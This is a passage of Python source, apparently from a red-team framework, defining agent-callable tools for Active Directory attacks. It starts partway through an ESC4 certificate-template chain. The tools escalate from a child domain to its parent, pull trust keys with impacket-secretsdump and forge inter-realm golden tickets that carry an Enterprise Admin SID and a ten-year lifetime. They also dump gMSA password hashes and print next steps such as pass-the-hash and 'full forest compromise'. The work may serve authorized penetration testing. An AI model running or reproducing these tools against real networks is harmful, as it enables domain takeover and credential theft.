        3. Authenticate with certificate to get NTLM hash

        Use when you have GenericAll/WriteDacl on a certificate template.

        Args:
            domain: Target domain
            username: User with write permissions on the template
            password: Password for authentication
            dc_ip: Domain controller IP
            template: Certificate template name
            ca: Certificate Authority name
            target_upn: User to impersonate (default: Administrator)

        Returns:
            Full chain result including NTLM hash if successful
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        results = []

        # Step 1: Modify template
        logger.info(f"[*] ESC4 Chain Step 1: Modifying template {template}")
        template_result = self.certipy_template_esc4(
            domain=domain,
            username=username,
            password=password,
            dc_ip=dc_ip,
            template=template,
        )
        results.append(f"=== STEP 1: TEMPLATE MODIFICATION ===\n{template_result}\n")

        if "failed" in template_result.lower() or "error" in template_result.lower():
            return "\n".join(results) + "\n❌ ESC4 chain failed at template modification step"

        # Step 2: Request certificate
        logger.info(f"[*] ESC4 Chain Step 2: Requesting certificate as {target_upn}")
        request_result = self.certipy_request(
            domain=domain,
            username=username,
            password=password,
            dc_ip=dc_ip,
            ca=ca,
            template=template,
            upn=target_upn,
        )
        results.append(f"=== STEP 2: CERTIFICATE REQUEST ===\n{request_result}\n")

        # Extract PFX path from result
        pfx_match = re.search(r"(\S+\.pfx)", request_result)
        if not pfx_match:
            return "\n".join(results) + "\n❌ ESC4 chain failed: No PFX file created"

        pfx_path = pfx_match.group(1)

        # Step 3: Authenticate with certificate
        logger.info("[*] ESC4 Chain Step 3: Authenticating with certificate")
        auth_result = self.certipy_auth(
            domain=domain,
            dc_ip=dc_ip,
            pfx_path=pfx_path,
        )
        results.append(f"=== STEP 3: CERTIFICATE AUTHENTICATION ===\n{auth_result}\n")

        # Check for success
        if "hash" in auth_result.lower():
            final_message = (
                f"🚨 ESC4 FULL CHAIN COMPLETE!\n"
                f"→ Template {template} modified\n"
                f"→ Certificate obtained for {target_upn}\n"
                f"→ NTLM hash extracted!\n"
                f"→ Use hash for pass-the-hash or secretsdump\n\n"
            )
            return final_message + "\n".join(results)

        return "\n".join(results) + "\n⚠️ ESC4 chain completed but hash extraction may have failed"


class TrustAttackTools(Toolset):
    """Tools for Active Directory trust relationship attacks.

    These tools enable escalation from child to parent domains
    and cross-forest attacks.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def raise_child(
        self,
        child_domain: str,
        username: str,
        password: str,
        target_domain: str | None = None,
    ) -> str:
        """
        Escalate from child domain to parent domain (raiseChild.py).

        Automates the child-to-parent domain escalation using the krbtgt hash
        from the child domain to forge a golden ticket with Enterprise Admin SID.

        Use after obtaining krbtgt hash from a child domain via secretsdump.

        Args:
            child_domain: Child domain where you have krbtgt (e.g., "child.domain.local")
            username: Username with access in child domain
            password: Password for authentication
            target_domain: Parent domain to escalate to (auto-detected if omitted)

        Returns:
            Escalation result with tickets and hashes

        Example:
            >>> raise_child("child.domain.local", "administrator", "pass")
        """
        cmd = [
            "raiseChild.py",
            f"{child_domain}/{username}:{password}",
        ]

        if target_domain:
            cmd.extend(["-target-domain", target_domain])

        try:
            logger.info(f"[*] Escalating from {child_domain} to parent domain")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            if "enterprise admin" in result.lower() or "golden ticket" in result.lower():
                logger.info("[+] Child-to-parent escalation successful!")
                result = (
                    "🚨 DOMAIN ESCALATION SUCCESSFUL!\n"
                    "\u2192 Enterprise Admin access obtained\n"
                    "\u2192 Use secretsdump on parent domain DCs\n\n" + result
                )

            return result

        except Exception as e:
            return f"raiseChild failed: {e}"

    @dn.tool_method
    def extract_trust_key(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        trusted_domain: str,
    ) -> str:
        """
        Extract trust key for cross-domain/cross-forest attacks.

        Requires Domain Admin on the source domain. The trust key is the NTLM hash
        of the trust account (TRUSTEDDOMAIN$) which can be used to create inter-realm
        tickets for cross-forest pivoting.

        Attack chain:
        1. Extract trust key (this tool)
        2. Get domain SIDs for both domains (get_sid)
        3. Create inter-realm ticket (create_inter_realm_ticket)
        4. Use ticket to access target forest

        Args:
            domain: Source domain where you have DA (e.g., 'sevenkingdoms.local')
            username: Domain Admin username
            password: DA password
            dc_ip: Source domain controller IP
            trusted_domain: Target trusted domain (e.g., 'essos.local' or 'ESSOS')

        Returns:
            Trust key (NTLM hash of trust account)

        Example:
            >>> extract_trust_key("sevenkingdoms.local", "Administrator", "pass", "192.168.58.10", "essos.local")
        """
        # Normalize trusted domain name to get trust account
        # Trust accounts are NETBIOS$, e.g., ESSOS$
        trust_domain_name = trusted_domain.split(".", maxsplit=1)[0].upper()
        trust_account = f"{trust_domain_name}$"

        cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc-user",
            trust_account,
        ]

        try:
            logger.info(f"[*] Extracting trust key for {trusted_domain} from {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            # Look for NTLM hash in output
            # Format: DOMAIN\TRUSTACCOUNT$:RID:LM:NT:::
            hash_match = re.search(
                rf"{trust_account}:\d+:[a-fA-F0-9]{{32}}:([a-fA-F0-9]{{32}})",
                result,
                re.IGNORECASE,
            )

            if hash_match:
                trust_hash = hash_match.group(1)
                logger.warning(f"[+] Trust key extracted for {trusted_domain}!")
                result = (
                    f"🚨 TRUST KEY EXTRACTED FOR {trusted_domain}!\n"
                    f"→ Trust account: {trust_account}\n"
                    f"→ NTLM hash: {trust_hash}\n"
                    f"→ Use with create_inter_realm_ticket for cross-forest access\n"
                    f"→ ATTACK CHAIN:\n"
                    f"   1. Get both domain SIDs with get_sid\n"
                    f"   2. Create inter-realm ticket with create_inter_realm_ticket\n"
                    f"   3. Use ticket to secretsdump target forest DCs\n\n" + result
                )

                # Add trust key as hash to state for tracking
                if self.state:
                    from ares.core.models import Hash, SharedRedTeamState

                    trust_hash_obj = Hash(
                        username=trust_account,
                        hash_value=trust_hash,
                        hash_type="NTLM",
                        domain=domain,
                        source="trust_key_extraction",
                    )
                    if isinstance(self.state, SharedRedTeamState):
                        self.state.add_hash(trust_hash_obj, "extract_trust_key")
                    elif hasattr(self.state, "hashes"):
                        self.state.hashes.append(trust_hash_obj)

            return result

        except Exception as e:
            return f"Trust key extraction failed: {e}"

    @dn.tool_method
    def create_inter_realm_ticket(
        self,
        source_domain: str,
        source_sid: str,
        trust_key: str,
        target_domain: str,
        target_sid: str,
        username: str = "Administrator",
        duration: int = 3650,
    ) -> str:
        """
        Create inter-realm golden ticket for cross-forest attack.

        Use after extracting trust key with extract_trust_key. Creates a ticket
        that grants Enterprise Admin access in the target forest.

        Args:
            source_domain: Domain where we have DA (e.g., 'sevenkingdoms.local')
            source_sid: SID of source domain (from get_sid)
            trust_key: NTLM hash of trust account (from extract_trust_key)
            target_domain: Target trusted domain (e.g., 'essos.local')
            target_sid: SID of target domain (from get_sid on target)
            username: User to impersonate (default: Administrator)
            duration: Ticket validity in days (default: 3650 = 10 years)

        Returns:
            Ticket generation result (saves .ccache file)

        Example:
            >>> create_inter_realm_ticket(
            ...     "sevenkingdoms.local",
            ...     "S-1-5-21-123...",
            ...     "aad3b435...",
            ...     "essos.local",
            ...     "S-1-5-21-456...",
            ... )
        """
        # Create Enterprise Admins SID for target forest (-519)
        enterprise_admin_sid = f"{target_sid}-519"

        cmd = [
            "impacket-ticketer",
            "-nthash",
            trust_key,
            "-domain-sid",
            source_sid,
            "-domain",
            source_domain,
            "-extra-sid",
            enterprise_admin_sid,
            "-spn",
            f"krbtgt/{target_domain}",
            "-duration",
            str(duration),
            username,
        ]

        try:
            logger.info(
                f"[*] Creating inter-realm ticket for {username} "
                f"({source_domain} → {target_domain})"
            )
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".ccache" in result:
                ticket_match = re.search(r"([^\s]+\.ccache)", result)
                ticket_path = ticket_match.group(1) if ticket_match else f"{username}.ccache"
                logger.warning(f"[+] Inter-realm ticket created: {ticket_path}")
                result = (
                    f"🚨 INTER-REALM TICKET CREATED!\n"
                    f"→ Ticket: {ticket_path}\n"
                    f"→ User: {username}\n"
                    f"→ Access: Enterprise Admin in {target_domain}\n"
                    f"→ NEXT STEPS:\n"
                    f"   1. export KRB5CCNAME={ticket_path}\n"
                    f"   2. secretsdump_kerberos to dump {target_domain} DCs\n"
                    f"   3. Full forest compromise achieved!\n\n" + result
                )

                if self.state:
                    self.state.has_golden_ticket = True
                    if hasattr(self.state, "operation_timeline"):
                        from ares.core.models import TimelineEvent

                        event = TimelineEvent(
                            id=f"evt-interrealm-{uuid.uuid4().hex[:8]}",
                            timestamp=datetime.now(timezone.utc),
                            source="create_inter_realm_ticket",
                            event_type="inter_realm_ticket",
                            description=f"Inter-realm ticket created for cross-forest attack: {source_domain} → {target_domain}",
                            mitre_technique="T1558.001",
                        )
                        self.state.operation_timeline.append(event)

            return result

        except Exception as e:
            return f"Inter-realm ticket creation failed: {e}"


class GMSATools(Toolset):
    """Tools for Group Managed Service Account (gMSA) password retrieval."""

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def gmsa_dump_passwords(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """Dump gMSA (Group Managed Service Account) passwords.

        gMSA accounts have auto-rotating passwords managed by AD. If you have
        read access to the msDS-ManagedPassword attribute (via PrincipalsAllowedToRetrieveManagedPassword),
        you can retrieve the NTLM hash of the gMSA account.

        gMSA accounts often have:
        - Service account privileges on multiple servers
        - SQL Server service accounts (can lead to xp_cmdshell)
        - IIS/web application service accounts
        - Scheduled task execution privileges

        Args:
            domain: Target domain (e.g., 'contoso.local')
            username: User with gMSA read rights
            password: Password for authentication
            dc_ip: Domain controller IP

        Returns:
            gMSA account names and their NTLM hashes
        """
        resolved_password = resolve_password(self.state, username, domain, password)
        if not resolved_password:
            return f"❌ No password available for {username}@{domain}"

        cmd = [
            "gMSADumper.py",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            resolved_password,
            "-l",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Dumping gMSA passwords from {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            # Extract gMSA hashes from output
            # Pattern: gMSA_Account$:::NTLM_HASH
            hash_pattern = r"(\S+\$?):::([a-fA-F0-9]{32})"
            found_hashes = []

            for match in re.finditer(hash_pattern, result):
                account = match.group(1)
                ntlm_hash = match.group(2)
                found_hashes.append((account, ntlm_hash))

                logger.warning(f"[+] gMSA hash found: {account}")

                if self.state and hasattr(self.state, "add_hash"):
                    hash_obj = Hash(
                        username=account,
                        hash_value=ntlm_hash,
                        hash_type="NTLM",
                        domain=domain,
                        source="gMSADumper",
                    )
                    self.state.add_hash(hash_obj)  # type: ignore[union-attr]

            if found_hashes:
                hash_summary = "\n".join(f"  - {acc}: {h[:16]}..." for acc, h in found_hashes)
                return (
                    f"✅ gMSA passwords retrieved!\n"
                    f"Found {len(found_hashes)} gMSA account(s):\n{hash_summary}\n\n"
                    f"→ Use these hashes with pass-the-hash (psexec/wmiexec) on servers where gMSA has access\n"
                    f"→ gMSA accounts often run SQL Server, IIS, or scheduled tasks\n\n"
                    f"{result}"
                )

            return f"gMSADumper result (no hashes extracted):\n{result}"

        except Exception as e:
            return f"gMSADumper failed: {e}"

    @dn.tool_method
    def gmsa_read_password_bloodyad(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        gmsa_account: str,
    ) -> str:
        """Read a specific gMSA account's password using bloodyAD.

        Alternative to gMSADumper for targeted gMSA password retrieval.
        Use this when you know the specific gMSA account name.

        Args:
            domain: Target domain (e.g., 'contoso.local')
            username: User with gMSA read rights
            password: Password for authentication
            dc_ip: Domain controller IP
            gmsa_account: gMSA account name (e.g., 'svc_sql$')

        Returns:
            gMSA account NTLM hash
        """
        resolved_password = resolve_password(self.state, username, domain, password)
        if not resolved_password:
            return f"❌ No password available for {username}@{domain}"

        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            resolved_password,
            "--host",
            dc_ip,
            "get",
            "object",
            gmsa_account,
            "--attr",
            "msDS-ManagedPassword",
        ]

        try:
            logger.info(f"[*] Reading gMSA password for {gmsa_account}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            # bloodyAD returns the password data which can be converted to NTLM
            if "msDS-ManagedPassword" in result or "NTLM" in result.upper():
                hash_match = re.search(r"([a-fA-F0-9]{32})", result)
                if hash_match:
                    ntlm_hash = hash_match.group(1)
                    logger.warning(
                        f"[+] gMSA hash retrieved for {gmsa_account}: {ntlm_hash[:16]}..."
                    )

                    if self.state and hasattr(self.state, "add_hash"):
                        hash_obj = Hash(
                            username=gmsa_account,
                            hash_value=ntlm_hash,
                            hash_type="NTLM",
                            domain=domain,
                            source="bloodyAD_gMSA",
                        )
                        self.state.add_hash(hash_obj)  # type: ignore[union-attr]

                    return (
                        f"✅ gMSA password retrieved for {gmsa_account}!\n"
                        f"→ NTLM: {ntlm_hash[:16]}...\n"
                        f"→ Use pass-the-hash on servers where {gmsa_account} has access\n\n"
                        f"{result}"
                    )

            return f"bloodyAD gMSA result:\n{result}"

        except Exception as e:
            return f"bloodyAD gMSA read failed: {e}"
